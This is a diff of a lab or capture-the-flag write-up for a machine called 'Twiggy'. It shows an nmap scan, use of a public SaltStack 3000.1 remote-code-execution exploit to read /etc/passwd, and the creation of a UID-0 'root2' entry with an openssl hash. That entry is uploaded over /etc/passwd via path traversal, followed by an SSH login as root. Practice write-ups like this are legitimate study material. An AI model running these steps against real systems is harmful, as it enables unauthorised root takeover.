@@ -3,7 +3,7 @@
 # 🐧Twiggy🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.242.62 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 18:38 AEDT
 Nmap scan report for 192.168.242.62
@@ -23,12 +23,13 @@ Nmap done: 1 IP address (1 host up) scanned in 406.01 seconds
 check the web and didn't have anything    
 then search ztmp exploit got the RCE script  
 https://www.exploit-db.com/exploits/48421
-```
+```console
 google search zmtp 2.0 exploit
 Exploit Title: Saltstack 3000.1 - Remote Code Execution
 ```
 look how the script works
-```$ python3 48421.py -h                                                    
+``` console
+$ python3 48421.py -h                                                    
 usage: 48421.py [-h] [--master MASTER_IP] [--port MASTER_PORT] [--force] [--debug] [--run-checks]
                 [--read READ_FILE] [--upload-src UPLOAD_SRC] [--upload-dest UPLOAD_DEST] [--exec EXEC]
                 [--exec-all EXEC_ALL]
@@ -50,7 +51,7 @@ options:
 ```
 It can read file, upload file and execute it  
 Try to read the /etc/passwd file and it works
-```
+```console
 $ python3 48421.py --master 192.168.242.62 --port 4506 --read /etc/passwd                           
 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
 /usr/local/lib/python3.13/dist-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
@@ -84,16 +85,16 @@ named:x:25:25:Named:/var/named:/sbin/nologin
 ```
 then try to add a user to the root groups and login  
 openssl to create a password 
-```
+```console
 $ openssl passwd password123
 $1$3/sbSf3N$MlLMTctwM/.BK9GOAmqm3.
 ```
 replace the x with the output
-```
+```console
 root2:$1$3/sbSf3N$MlLMTctwM/.BK9GOAmqm3.:0:0:root:/root:/bin/bash
 ```
 upload the file and replace the original one
-```
+```console
 $ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upload-dest ../../../../../etc/passwd
 
 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
@@ -107,7 +108,7 @@ $ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upl
 ```
 login via ssh with the new user root2 and the password we just created    
 And we got the root shell
-```
+```console
 $ ssh root2@192.168.242.62  
 root2@192.168.242.62's password: 
 Last failed login: Sat Jan 31 04:58:59 EST 2026 from 192.168.45.208 on ssh:notty
